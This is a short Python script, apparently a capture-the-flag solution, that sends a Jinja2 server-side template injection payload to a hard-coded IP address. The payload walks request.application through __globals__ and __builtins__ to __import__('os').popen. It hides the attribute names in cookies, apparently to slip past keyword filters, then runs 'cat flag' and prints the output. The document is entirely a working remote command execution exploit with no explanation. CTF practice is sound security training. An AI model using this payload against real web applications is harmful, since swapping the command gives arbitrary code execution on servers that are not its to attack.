import requests

url = 'http://35.242.253.155:31612/'

params = {
    "content": "{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']]('os')[request.cookies['e']](request.cookies['f'])['read']()}}"
}

cookies = {
    'a': 'application',
    'b': '__globals__',
    'c': '__builtins__',
    'd': '__import__',
    'e': 'popen',
    'f': 'cat flag'
}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)